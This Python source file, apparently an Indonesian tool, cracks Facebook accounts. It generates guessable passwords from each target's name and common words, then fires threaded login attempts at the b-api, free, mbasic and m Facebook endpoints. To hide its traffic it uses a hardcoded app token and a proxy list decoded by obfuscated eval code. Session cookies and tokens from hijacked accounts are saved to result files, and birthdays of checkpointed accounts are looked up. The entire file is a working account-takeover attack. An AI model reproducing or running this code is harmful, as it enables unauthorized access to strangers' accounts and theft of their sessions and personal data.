# hallo bro :v

from modul import *
from .useragent import *
from datetime import datetime
import concurrent.futures
import urllib.request
import random

proxsi=(lambda _____,____:____(_____))((lambda ___,____:___(___,____))(lambda ____,___:chr(___%256)+____(____,___//256) if ___ else "",(lambda _,__:_(__))(eval((lambda ___,__,_____:__.join([___(____) for ____ in _____]))(chr,"",[95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 114, 97, 110, 100, 111, 109, 34, 41, 46, 99, 104, 111, 105, 99, 101])),[90303591951000500971495966594365451252957766916213817646281832, 332798659791143407785433899392687653739576225515591640011914742731142248, 332798659791143408361614843303095396223991536563341124993852598654366824, 387850974140875986728004033290591309463752306018859242675423235064231016, 5183420023902001604573362278614355685819887490665945717976524420200, 5078104550035757575350032592782544401039075905101327617977708999784, 1299994764809153937421826311401651407944981112579979429290400732705896, 1326955526118912410762045741790282438979291450394033687748872907289704, 1515042867737796822412344361743746153335269769759989683701604116886632, 387850974140875986439164541745950457425816394150536258319392722772063336, 19836452484024441279959321488471242344163633206410992316147070056, 19836345898577178039951513554852895679056620107742345115232138344, 19836345898577178040084446576179199690733918350750937120951792744, 77486142515729254155346906250388756797410603443522079500301416, 5078104550035757573877201917256671234164045000827586220194736141416, 77486142515727786967019884687575787322119482358761900928693352, 5078104550035757576805825326791235308723818063272449796802914579560, 1299994764809153937418886426287624944002493117664059253142119263794280, 5078131835911025458845099276424810000030900155919032533142625088616, 19836452484026310540553208073880283181449571999113135346326729832, 332798659791143407978492419476843898830662554450479250986535879661876328, 1299994764809153937415986014365091770887201343963446517125292659864680, 1299994764809153936669135953142186546877506362842516112656375152407656, 77485726166317101696257135024715887211820081395135325159060584, 302680244202044407587164610921747627497526224122043973268584, 5078104550035757569509735383701076583221020668019152261033762255976, 1299994764809153937421826311749419986816485763394545336478746226750568, 1299994764809153940029150941129077226905311554812985111204381540512872, 1299994764809153937411578896497123534053800967963072973491989493609576, 332798659791143407882711448373606776567967811135642650766386016466269288, 5078131835910257341814139436455532590900383801824059643051549946984, 5078131835910450398872810897353923714008553352486919608259694589032, 85196456906532712516532376082527498458463862187342365760499164268952056936, 85196456906532712491820885486065127721756444470769277545067603002679129192, 85196456906532712466822426103004713758009824692128575197294245576485139560, 5078131835910927433007146586844763085777725896614992496764111844456, 85196456906532712491150792837042148089663945857468004490067271094923195496, 77486142515727775460443101251779680414361424192185904712152168, 1299994764809153937795970730993239489238957142205131439938737509004392, 332798659791143408074267573408481334639489142432627184179039878904050792, 332798659791143408363111420957944169360506440404857958456797738317411432, 332798659791143408073525102098578514462484722760120294097690274819241064, 1299994764809153937781384348252737132920390681912308536169278511281256, 1299994764809153937788668931102499158605645381364051643450629184320616])),eval((lambda ___,__,_____:__.join([___(____) for ____ in _____]))(chr,"",[95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 117, 114, 108, 108, 105, 98, 46, 114, 101, 113, 117, 101, 115, 116, 34, 41, 46, 114, 101, 113, 117, 101, 115, 116, 46, 117, 110, 113, 117, 111, 116, 101])))

pw_tambahan="""

bismillah|sayang|bangsat|anjing|kontol|rahasia|cantik|786786|bajingan
""".strip().split("|")
ngntd=((())>(()))+((())>(()))
def awok(ngentod):
        return ["1234",ngentod,ngentod+"123",ngentod+"12345"]
def pw_list(ngentot):
        if len(ngentot)==2:
                aap_afandi=ngentot[1].split(" ")
                if len(aap_afandi[ngntd])!=ngntd:
                        asu=awok(aap_afandi[ngntd].lower())
                        if len(aap_afandi[ngntd]) < 6:
                                del asu[ngntd]
                                [asu.append(x) for x in pw_tambahan]
                        else:
                                [asu.append(x) for x in pw_tambahan]
                else: asu=pw_tambahan
        else: asu=pw_tambahan
        return asu


if os.path.exists("saya_gans/ngewe/.useragent"):
	if os.path.getsize("saya_gans/ngewe/.useragent")!=0:
		ghbbjiuGghgYyhhhjjjjjhyhhgtujnkkkiDghgtjkiukloudgjbfjii76jhghvfjjjko9ihfddfzayjhfujgjkhhjhunhgkhui77577u6jjghhfhkhhnhgghh__jjthjgkoio9yrkfjyhgryutiuuykkooyshjbvdeaathhf__hhvvvbnnnnmjhewyjheyjhhgttr665yhhjjghjgdsfjnnjDgggdgghyyjhhhhhyyyyyyyyatggg=open("saya_gans/ngewe/.useragent").read().strip()

ok,cp,cout,live,chek,kumpul,lahir=0,0,0,[],[],[],""

class crack:
	def __init__(self,url,user):
		
		print()
		self.url=url
		self.user=user
		self.token=open("cookies/token.txt").read() if os.path.exists("cookies/token.txt") else None
		self.naroskeun()

	def naroskeun(self):
		NAROSKEUN=input(f" ? Apakah Menggunakan Passeord Manual ?? {k}[ {c}Y/n{k} ]{q}")
		while NAROSKEUN in (""," "):
			print(" ! Jangan Kosong Kntl")
			NAROSKEUN=input(f" ? Apakah Menggunakan Passeord Manual ?? {k}[ {c}Y/n{k} ]{q}")
#			NAROSKEUN=input(" ? ingin menggunakan password manual Y/T : ")
		if NAROSKEUN in tuple("yY"):
			print(" * Info   ; 'first' Untuk Menggunakan Nama Depannya !!")
			print(" * Contoh : first123,bajingan,indonesia,kontolbapakkau,sayang")
			password=input(" ? Password: ")
			while len(password) < 6:
				print(" ! Anak Kontol" if password in (""," ") else " ! Password Minimal 6 Huruf / Angka")
				password=input(" ? Password : ")
			jalan2(f"\n ! {c}Pilih Method Login Ngab{k}")
			print(" 1. Method B-api (Fast Crack)")
			print(" 2. Method Free.Facebook (Slow Crack)")
			print(" 3. Method Mbasic.Facebook (Slow Crack)")
			print(f" 4. Method M.Facebook (Slow Crack){q}")
			self.awokawok_ngentod(password)
			self.awokawok_ngentod(password.split(","))
		if NAROSKEUN in tuple("tT"):
			jalan2(f"\n ! {c}Pilih Method Login Ngab{k}")
			print(" 1. Method B-api (Fast Crack)")
			print(" 2. Method Free.Facebook (Slow Crack)")
			print(" 3. Method Mbasic.Facebook (Slow Crack)")
			print(f" 4. Method M.Facebook (Slow Crack){q}")
			self.awokawok_ngentod()
		else:
			print(" ! Pantek/Kontol");self.naroskeun()
	
	def lovyu(self,username,password,url,**data):
		ses=req.session()
		respon=ses.get(url+"/login/?next&ref=dbl&fl&refid=8")
		parsing=parser(respon.text,"html.parser")
		action=parsing.find("form",{"method":"post"})["action"]
		kecuali=["sign_up","_fb_noscript"]
		for INPUT in parsing.find_all("input",{"name":True,"value":True}):
			if INPUT["name"] in kecuali:
				continue
			else:
				data.update({INPUT["name"]:INPUT["value"]})
		data.update({"email":username,"pass":password})
		ses.headers.update({"Host":url.split("//")[1],"cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ghbbjiuGghgYyhhhjjjjjhyhhgtujnkkkiDghgtjkiukloudgjbfjii76jhghvfjjjko9ihfddfzayjhfujgjkhhjhunhgkhui77577u6jjghhfhkhhnhgghh__jjthjgkoio9yrkfjyhgryutiuuykkooyshjbvdeaathhf__hhvvvbnnnnmjhewyjheyjhhgttr665yhhjjghjgdsfjnnjDgggdgghyyjhhhhhyyyyyyyyatggg,"content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","referer":url+"/login/?next&ref=dbl&fl&refid=8"})
		ses.post(url+action,data=data,proxies=dict(http=proxsi),allow_redirects=False)
		return ses.cookies.get_dict()
	
	def fckyu(self,username,password,url,**data):
		ses=req.session()
		ses.headers.update({"Host":url.split("//")[1],"upgrade-insecure-requests":"1","user-agent":eval((lambda ____,__,___: __.join([___(_____) for _____ in ____]))([95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 115, 97, 121, 97, 95, 103, 97, 110, 115, 34, 41, 46, 110, 103, 101, 119, 101, 46, 117, 115, 101, 114, 97, 103, 101, 110, 116, 46, 103, 104, 98, 98, 106, 105, 117, 71, 103, 104, 103, 89, 121, 104, 104, 104, 106, 106, 106, 106, 106, 104, 121, 104, 104, 103, 116, 117, 106, 110, 107, 107, 107, 105, 68, 103, 104, 103, 116, 106, 107, 105, 117, 107, 108, 111, 117, 100, 103, 106, 98, 102, 106, 105, 105, 55, 54, 106, 104, 103, 104, 118, 102, 106, 106, 106, 107, 111, 57, 105, 104, 102, 100, 100, 102, 122, 97, 121, 106, 104, 102, 117, 106, 103, 106, 107, 104, 104, 106, 104, 117, 110, 104, 103, 107, 104, 117, 105, 55, 55, 53, 55, 55, 117, 54, 106, 106, 103, 104, 104, 102, 104, 107, 104, 104, 110, 104, 103, 103, 104, 104, 95, 95, 106, 106, 116, 104, 106, 103, 107, 111, 105, 111, 57, 121, 114, 107, 102, 106, 121, 104, 103, 114, 121, 117, 116, 105, 117, 117, 121, 107, 107, 111, 111, 121, 115, 104, 106, 98, 118, 100, 101, 97, 97, 116, 104, 104, 102, 95, 95, 104, 104, 118, 118, 118, 98, 110, 110, 110, 110, 109, 106, 104, 101, 119, 121, 106, 104, 101, 121, 106, 104, 104, 103, 116, 116, 114, 54, 54, 53, 121, 104, 104, 106, 106, 103, 104, 106, 103, 100, 115, 102, 106, 110, 110, 106, 68, 103, 103, 103, 100, 103, 103, 104, 121, 121, 106, 104, 104, 104, 104, 104, 121, 121, 121, 121, 121, 121, 121, 121, 97, 116, 103, 103, 103],"",chr)),"content-type":"text/html; charset=utf-8","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
		respon=ses.get(url+"/login/?next&ref=dbl&fl&refid=8")
		parsing=parser(respon.text,"html.parser")
		action=parsing.find("form",{"method":"post"})["action"]
		dtsg=re.findall('{"dtsg":{"token":"(.*?)"',respon.text)
		time=int(datetime.now().timestamp())
		kecuali=["sign_up","_fb_noscript"]
		for INPUT in parsing.find_all("input",{"value":True}):
			if INPUT["name"] in kecuali:
				continue
			else:
				data.update({INPUT["name"]:INPUT["value"]})
		data.update({"email":username,"pass":password,"prefill_contact_point":"","prefill_source":"","prefill_type":"","first_prefill_source":"","first_prefill_type":"","had_cp_prefilled":"false","had_password_prefilled":"false","is_smart_lock":"false","_fb_noscript":"true"})
		if dtsg:
			data.update({"fb_dtsg":dtsg[0]})
		ses.headers.update({"cache-control":"max-age=0","content-type":"application/x-www-form-urlencoded","referer":url+"/login/?next&ref=dbl&fl&refid=8"})
		ses.post(url+action,data=data,allow_redirects=False)
		return ses.cookies.get_dict()
	
	def bapi(self,username,password):
		ses=req.session()
		ses.headers.update({"x-fb-connection-bandwidth":str(random.randint(20000000.0, 30000000.0)),"x-fb-sim-hni":str(random.randint(20000, 40000)),"x-fb-net-hni":str(random.randint(20000, 40000)),"x-fb-connection-quality":"EXCELLENT","x-fb-connection-type":"cell.CTRadioAccessTechnologyHSDPA","user-agent":ghbbjiuGghgYyhhhjjjjjhyhhgtujnkkkiDghgtjkiukloudgjbfjii76jhghvfjjjko9ihfddfzayjhfujgjkhhjhunhgkhui77577u6jjghhfhkhhnhgghh__jjthjgkoio9yrkfjyhgryutiuuykkooyshjbvdeaathhf__hhvvvbnnnnmjhewyjheyjhhgttr665yhhjjghjgdsfjnnjDgggdgghyyjhhhhhyyyyyyyyatggg,"content-type":"application/x-www-form-urlencoded","x-fb-http-engine":"Liger"})
		ses.params.update({"access_token":"350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format":"JSON","sdk_version":"2","email":username,"locale":"en_US","password":password,"sdk":"ios","generate_session_cookies":"1","sig":"3f555f99fb61fcd7aa0c44f58f522ef6"})
		return ses.get("https://b-api.facebook.com/method/auth.login",proxies=dict(http=proxsi)).json()
	
	def awokawok_ngentod(self,manual=None):
		pilih=input(" ? Method: ")
		while pilih in (""," "):
			print(f" ! {kosong}")
			pilih=input(" ? Method : ")
		url="https://{}.facebook.com"
		speed=40 if manual is None else 30
		if speed==30:
			speed=40 if len(manual.split(",")) <= 5 else 30
		if pilih in ("1","01"):
			print(" * Token Tidak Ada :P" if self.token else " ! Token Tidak Tersambung")
			tod=self.awikwok()
			self.attack(self.bapi,speed,manual,url,tod)
			self.result()
			print(f" * Hasil {k}CP{q} DiSimpan Di: Hasil/chek.txt")
			print(f" * Hasil {i}OK{q} DiSimpan Di: Hasil/live.txt")
			jalan2(f' ! {c}Untuk StopKan Cracking Silahkan Tekan : {i}CTRL + Z{q}\n')
		if pilih in ("2","02"):
			print(" * Token Tidak Ada :P" if self.token else " ! Token Tidak Tersambung")
			tod=self.awikwok()
			self.attack(self.lovyu,speed,manual,url.format("free"),tod)
			self.result()
			print(f" * Hasil {k}CP{q} DiSimpan Di: Hasil/chek.txt")
			print(f" * Hasil {i}OK{q} DiSimpan Di: Hasil/live.txt")
			jalan2(f' ! {c}Untuk StopKan Cracking Silahkan Tekan : {i}CTRL + Z{q}\n')
		if pilih in ("3","03"):
			print(" * Token Tidak Ada :P" if self.token else " ! Token Tidak Tersambung")
			tod=self.awikwok()
			self.attack(self.lovyu,speed,manual,url.format("mbasic"),tod)
			self.result()
			print(f" * Hasil {k}CP{q} DiSimpan Di: Hasil/chek.txt")
			print(f" * Hasil {i}OK{q} DiSimpan Di: Hasil/live.txt")
			jalan2(f' ! {c}Untuk StopKan Cracking Silahkan Tekan : {i}CTRL + Z{q}\n')
		if pilih in ("4","04"):
			print(" * Token Tidak Ada :P" if self.token else " ! Token Tidak Tersambung")
			tod=self.awikwok()
			self.attack(self.fckyu,speed,manual,url.format("m"),tod)
			self.result()
		else:
			print(f" ! {w}{kosong}{q}");self.awokawok_ngentod(manual)
			
	def attack(self,login,speed,password,url,tolol):
		for pengguna in self.user:
			membagi=pengguna.split("(Aap Gans)")
			if password:
				if "first" in password:
					if len(membagi[1].split(" "))!=0:
						kumpul.append({"username":membagi[0],"password":password.replace("first",membagi[1].split(" ")[0].lower()).split(",")})
				else:
					kumpul.append({"username":membagi[0],"password":password.split(",")})
			else:
				kumpul.append({"username":membagi[0],"password":pw_list(membagi)})
		print(f"\r * Crack {cout}/{len(self.user)} {i}OK{q}:-{ok} {k}CP{q}:-{cp}",end="")
#		print(" * crack started\n * press ctrl+z to stop\n")
		with concurrent.futures.ThreadPoolExecutor(max_workers=speed) as U:
			if "bapi" in str(login):
				for x in kumpul:
					U.submit(self.log_bapics,x["username"],x["password"],login,tolol)
			else:
				for x in kumpul:
					U.submit(self.log_mbasic,x["username"],x["password"],login,url,tolol)

	def log_mbasic(self,username,list_password,login,url,ttl):
		try:
			global ok,cp,cout,lahir
			for password in list_password:
				rincian=login(username,password,url)
				if "c_user" in rincian:
					ok+=1
					(lambda cookies,uid: self.save(f"\x1b[1;32m*--> {uid}|{password}|{cookies}","result/live.txt",live))((lambda: ";".join([_+"="+__ for _,__ in rincian.items()]))(),rincian['c_user']);break
				if "checkpoint" in rincian:
					cp+=1
					uid=json.loads(urllib.request.unquote(rincian["checkpoint"]))["u"]
					if ttl:
						lahir=req.get("https://graph.facebook.com/{}/?access_token={}".format(str(uid),self.token)).json()
						lahir="|"+lahir["birthday"] if "birthday" in lahir else ""
					self.save(f"\x1b[1;33m*--> {uid}|{password}{lahir}","result/chek.txt",chek);break
				else:
					continue
			cout+=1
			print(f"\r * Crack {cout}/{len(self.user)} {i}OK{q}:-{ok} {k}CP{q}:-{cp}",end="")
#			print(f"\r * crack {cout}/{len(self.user)} ok:-{ok} cp:-{cp}",end="")
		except:
			self.log_mbasic(username,list_password,login,url,ttl)

	def log_bapics(self,username,list_password,login,ttl):
		try:
			global ok,cp,cout,lahir
			for password in list_password:
				rincian=login(username,password)
				if "session_key" in str(rincian) and "EAAA" in str(rincian):
					ok+=1
					(lambda token,uid:self.save(f"\x1b[1;32m*--> {uid}|{password}|{token}","result/live.txt",live))(rincian["access_token"],rincian["uid"]);break
				if "www.facebook.com" in rincian["error_msg"]:
					cp+=1
					uid=username
					if "request_args" in rincian:
						# menghindari nyasar :v
						for x in rincian["request_args"]:
							if "email" in x["key"]:
								uid=x["value"];break
					if ttl:
						lahir=req.get("https://graph.facebook.com/{}/?access_token={}".format(str(uid),self.token)).json()
						lahir="|"+lahir["birthday"] if "birthday" in lahir else ""
					self.save(f"\x1b[1;33m*--> {uid}|{password}{lahir}","result/chek.txt",chek);break
				else:
					continue
			cout+=1
			print(f"\r * Crack {cout}/{len(self.user)} {i}OK{q}:-{ok} {k}CP{q}:-{cp}",end="")
		except:
			self.log_bapics(username,list_password,login,ttl)
				
	def save(self,*memek):
		view=memek[0]
		print(f"\r {view}\x1b[0m\n",end="")
		open(memek[1],"a").write(re.findall("> (.+)",view)[0]+"\n")
		memek[2].append(view)

	def result(self):
		if len(live)!=0 or len(chek)!=0:
			print(f"\n\n * Cracking Done !!\n * LIVE/CHEK : {i}{len(live)}{q}/{k}{len(chek)}{q}")
			if len(live)!=0:
				print(f" * Hasil {i}OK{q} DiSimpan Di: Hasil/live.txt")
			if len(chek)!=0:
				print(f" * Hasil {k}CP{q} DiSimpan Di: Hasil/chek.txt")
				exit()
		else:
			exit("\n ! HAHAHA Engga Ada Hasil")

	def awikwok(self):
		if self.token:
			n=input(f" ? Apakah Anda Mau Crack DiTambah Tanggal Lahir.. {k}[ {c}Y/n {k}]{q}")
			if n in tuple("yY"):
				print(f" * Hasil {k}CP{q} DiSimpan Di: Hasil/chek.txt")
				print(f" * Hasil {i}OK{q} DiSimpan Di: Hasil/live.txt")
				jalan2(f' ! {c}Untuk StopKan Cracking Silahkan Tekan : {i}CTRL + Z{q}\n')
				return True
			if n in tuple("tT"):
				print(f" * Hasil {k}CP{q} DiSimpan Di: Hasil/chek.txt")
				print(f" * Hasil {i}OK{q} DiSimpan Di: Hasil/live.txt")
				jalan2(f' ! {c}Untuk StopKan Cracking Silahkan Tekan : {i}CTRL + Z{q}\n')
				return False
			else:
				print(f" ! {c}{kosong}{q}")
				return self.awikwok()
			
